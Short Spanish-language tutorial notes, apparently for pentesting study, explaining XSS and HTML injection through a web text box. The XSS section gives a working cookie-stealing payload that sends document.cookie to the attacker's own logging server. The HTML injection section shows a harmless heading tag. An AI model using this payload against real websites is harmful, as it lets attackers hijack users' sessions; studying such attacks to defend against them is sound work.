XSS y HTML Injection


XSS

A traves de una textbox por ejemplo en una web podremos introducir codigo Javascript y el servidor lo interpretara

<script>document.write('<img src="http://127.0.0.1/imagen.jpg?=' + document.cookie + ' ">')</script>

Con este script lo que haremos es enviar a nuestro servidor un log el cual nos indicara la cookie de session

HTML INJECTION

A traves de una textbox por ejemplo en una web podremos introducir etiquetas HTML y el servidor nos las interpretara

<h1>Prueba</h1>

Si introducieramos lo anterior y el servidor estuviera mal sanitizado, veriamos el texto como si fuera un titulo
